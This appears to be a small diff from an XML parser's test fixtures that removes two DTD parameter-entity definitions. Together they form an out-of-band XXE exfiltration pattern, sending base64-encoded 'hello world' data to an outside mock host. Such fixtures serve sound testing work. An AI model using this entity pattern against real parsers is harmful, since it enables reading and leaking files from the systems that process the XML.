@@ -1,2 +1,0 @@
-<!ENTITY % three SYSTEM "data://text/plain;base64,aGVsbG8gd29ybGQ=">
-<!ENTITY % two "<!ENTITY four SYSTEM 'http://demo6986808.mockable.io/?test=%three;'>">
